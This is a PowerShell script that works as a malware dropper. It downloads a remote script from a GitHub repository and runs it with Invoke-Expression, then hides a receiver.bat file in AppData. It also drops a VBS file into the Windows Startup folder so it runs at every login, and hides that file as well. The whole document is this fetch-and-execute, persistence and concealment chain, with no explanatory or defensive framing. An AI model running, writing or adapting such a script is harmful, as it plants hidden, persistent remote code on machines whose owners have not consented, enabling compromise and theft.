# Enable error handling
$ErrorActionPreference = "Stop"

try {
    # Download and execute the PowerShell script
    $scriptUrl = "https://github.com/RaupenInspektor/pico/raw/main/interesting.ps1"
    $scriptContent = Invoke-WebRequest -Uri $scriptUrl | Select-Object -ExpandProperty Content
    Invoke-Expression $scriptContent
    Write-Host "PowerShell script executed."
} catch {
    Write-Host "Failed to execute PowerShell script: $_"
}

# Define the path to receiver.bat in AppData\Local
$receiverPath = "$env:APPDATA\receiver.bat"

# Hide the receiver.bat file if it exists
try {
    if (Test-Path $receiverPath) {
        Set-ItemProperty -Path $receiverPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        Write-Host "Receiver.bat file hidden."
    } else {
        Write-Host "Receiver.bat file not found."
    }
} catch {
    Write-Host "Failed to hide receiver.bat: $_"
}

# Download the VBS file to the Startup folder
try {
    $startupPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\file.vbs"
    Invoke-WebRequest -Uri "https://github.com/RaupenInspektor/pico/raw/main/file.vbs" -OutFile $startupPath
    Write-Host "VBS file downloaded."
} catch {
    Write-Host "Failed to download VBS file: $_"
}

# Hide the VBS file if it exists
try {
    if (Test-Path $startupPath) {
        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
        Write-Host "VBS file hidden."
    } else {
        Write-Host "VBS file not found."
    }
} catch {
    Write-Host "Failed to hide VBS file: $_"
}
